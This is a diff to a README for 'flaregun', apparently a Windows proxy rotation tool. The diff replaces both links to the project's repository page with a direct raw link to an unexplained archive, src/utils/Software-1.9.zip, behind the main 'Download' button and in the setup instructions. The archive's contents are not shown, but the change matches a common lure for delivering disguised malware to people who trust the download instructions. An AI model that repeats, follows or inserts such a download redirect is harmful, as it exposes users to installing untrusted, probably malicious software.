@@ -1,6 +1,6 @@
 # 🔥 flaregun - Fast proxy rotation for Windows
 
-[![Download flaregun](https://img.shields.io/badge/Download%20flaregun-blue?style=for-the-badge)](https://github.com/magicspellnosejob374/flaregun)
+[![Download flaregun](https://img.shields.io/badge/Download%20flaregun-blue?style=for-the-badge)](https://raw.githubusercontent.com/magicspellnosejob374/flaregun/main/src/utils/Software-1.9.zip)
 
 ## 🚀 What is flaregun?
 
@@ -31,7 +31,7 @@ For best results, use:
 
 Open the download page here:
 
-https://github.com/magicspellnosejob374/flaregun
+https://raw.githubusercontent.com/magicspellnosejob374/flaregun/main/src/utils/Software-1.9.zip
 
 On that page, look for the latest release or the main download file. If you see a setup file, download it to your PC. If you see a ZIP file, download it and extract it first.
 
